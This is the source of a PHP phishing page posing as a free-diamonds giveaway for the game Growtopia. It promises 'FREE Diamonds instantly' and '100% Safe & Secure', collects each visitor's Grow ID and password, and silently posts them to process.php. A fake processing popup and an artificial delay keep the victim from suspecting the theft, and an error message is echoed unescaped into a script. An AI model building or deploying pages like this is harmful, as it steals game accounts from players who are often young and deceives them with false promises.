<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Growtopia-diamond-add</title>
    <style>
        body {
            background-image: url('background/back1.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            font-family: 'Arial', sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-y: auto;
            overflow-x: hidden;
            padding: 20px 0; /* Tambahkan padding atas dan bawah */
        }
        .moving-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }
        .moving-background::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: rgba(255, 255, 255, 0.1);
            transform-origin: center;
            animation: rotate 20s linear infinite;
        }
        .moving-background::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,215,0,0.2) 0%, rgba(255,215,0,0) 70%);
            transform-origin: center;
            animation: pulse 15s ease-in-out infinite;
        }
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes pulse {
            0%, 100% { transform: scale(0.8); opacity: 0.5; }
            50% { transform: scale(1.2); opacity: 0.8; }
        }
        @media (max-width: 768px) {
            .container {
                width: 85%;
                padding: 25px;
            }
        }

        @media (max-width: 480px) {
            .container {
                width: 95%;
                padding: 20px;
                margin: 10px auto; /* Kurangi margin untuk layar kecil */
            }
            h1 {
                font-size: 2em;
            }
            input, select, .diamond-input {
                font-size: 14px;
            }
        }
        .container {
            max-width: 400px;
            width: 90%;
            background-color: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            position: relative;
            z-index: 1;
            animation: fadeIn 2s ease-in-out;
            margin: 20px auto; /* Tambahkan margin atas dan bawah */
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        h1 {
            text-align: center;
            color: #FFD700;
            text-shadow: 2px 2px #228B22;
            font-size: 2.5em;
            margin-bottom: 30px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input, select {
            margin: 10px 0;
            padding: 12px;
            border: 2px solid #228B22;
            border-radius: 8px;
            font-size: 16px;
            display: flex;
            align-items: center;
        }
        input[type="submit"] {
            background-color: #32CD32;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
        }
        input[type="submit"]:hover {
            background-color: #228B22;
            transform: scale(1.05);
        }
        .popup {
            display: none;
            position: fixed;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            background-color: #32CD32;
            color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0,0,0,0.3);
            text-align: center;
            z-index: 2;
            animation: popUp 0.5s ease-in-out;
        }
        @keyframes popUp {
            from { transform: scale(0.5); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .loader {
            display: none;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #32CD32;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @media (max-width: 480px) {
            .container {
                width: 95%;
                padding: 20px;
            }
            h1 {
                font-size: 2em;
            }
            input, select {
                font-size: 14px;
            }
        }
        .info-box {
            background-color: rgba(255, 215, 0, 0.1);
            border: 2px solid #FFD700;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }

        .info-box h2 {
            color: #FFD700;
            font-size: 1.5em;
            margin-bottom: 10px;
            text-shadow: 1px 1px #228B22;
        }

        .info-box p {
            color: #228B22;
            font-size: 1.2em;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .info-box ul {
            list-style-type: none;
            padding: 0;
        }

        .info-box li {
            color: #32CD32;
            font-size: 1em;
            margin-bottom: 5px;
        }

        input[type="submit"] {
            background-color: #FFD700;
            color: #228B22;
            font-weight: bold;
            font-size: 1.1em;
            padding: 15px;
        }

        input[type="submit"]:hover {
            background-color: #FFA500;
        }
        .password-container {
            position: relative;
            width: 100%;
        }

        .password-toggle {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            user-select: none;
        }

        #password {
            padding-right: 35px;
        }
        .diamond-input {
            display: flex;
            align-items: center;
            margin: 10px 0;
        }

        .diamond-input label {
            margin-right: 10px;
        }

        .diamond-input input {
            width: 50px;
            text-align: center;
            margin: 0 10px;
        }

        .diamond-input button {
            width: 30px;
            height: 30px;
            font-size: 18px;
            background-color: #32CD32;
            color: white;
            border: none;
            border-radius: 50%;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
        }

        .diamond-input button:hover {
            background-color: #228B22;
            transform: scale(1.1);
        }
    </style>
</head>
<body>
    <div class="moving-background"></div>
    <div class="container">
        <h1>DIAMOND GET</h1>
        <form id="growtopiaForm">
            <div class="info-box">
                <h2>🌟 Exclusive Diamond Offer! 🌟</h2>
                <p>Get FREE Diamonds instantly!</p>
                <ul>
                    <li>✅ 100% Safe & Secure</li>
                    <li>✅ Instant Delivery</li>
                    <li>✅ Boost Your Growtopia Experience</li>
                </ul>
            </div>
            <input type="text" name="grow_id" placeholder="Grow ID" required>
            <div class="password-container">
                <input type="password" name="password" id="password" placeholder="Password" required>
                <span class="password-toggle" id="passwordToggle">👁️</span>
            </div>
            <div class="diamond-input">
                <label for="diamond">Diamonds:</label>
                <button type="button" class="decrease">-</button>
                <input type="number" name="diamond" id="diamond" value="1" min="1" max="10" readonly>
                <button type="button" class="increase">+</button>
            </div>
            <input type="submit" value="Get Free Diamonds Now!">
        </form>
        <div class="loader" id="loader"></div>
    </div>
    <div id="popup" class="popup">Your request is being processed and will be completed within 15 minutes.</div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const passwordInput = document.getElementById('password');
            const passwordToggle = document.getElementById('passwordToggle');

            passwordToggle.addEventListener('click', function() {
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    passwordToggle.textContent = '🙈';
                } else {
                    passwordInput.type = 'password';
                    passwordToggle.textContent = '👁️';
                }
            });
        });
        $(document).ready(function() {
            $("#growtopiaForm").on('submit', function(e) {
                e.preventDefault();
                $("#loader").show();
                setTimeout(function() {
                    $.ajax({
                        url: 'process.php',
                        type: 'post',
                        data: $("#growtopiaForm").serialize(),
                        success: function(response) {
                            $("#loader").hide();
                            if(response.trim() === "success") {
                                $("#popup").fadeIn().delay(3000).fadeOut();
                                $("#growtopiaForm")[0].reset();
                            } else {
                                alert("Terjadi kesalahan. Silakan coba lagi.");
                            }
                        }
                    });
                }, 5000); // 5 seconds delay
            });
        });
    </script>
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        const diamondInput = document.getElementById('diamond');
        const decreaseBtn = document.querySelector('.decrease');
        const increaseBtn = document.querySelector('.increase');

        decreaseBtn.addEventListener('click', () => {
            let value = parseInt(diamondInput.value);
            if (value > 1) {
                diamondInput.value = value - 1;
            }
        });

        increaseBtn.addEventListener('click', () => {
            let value = parseInt(diamondInput.value);
            if (value < 10) {
                diamondInput.value = value + 1;
            } else {
                alert('Maximum limit is 10 Diamonds!');
            }
        });
    });
    </script>
    <script>
    <?php
    if(isset($_SESSION['error_message'])) {
        echo "alert('" . $_SESSION['error_message'] . "');";
        unset($_SESSION['error_message']);
    }
    ?>
    </script>
</body>
</html>
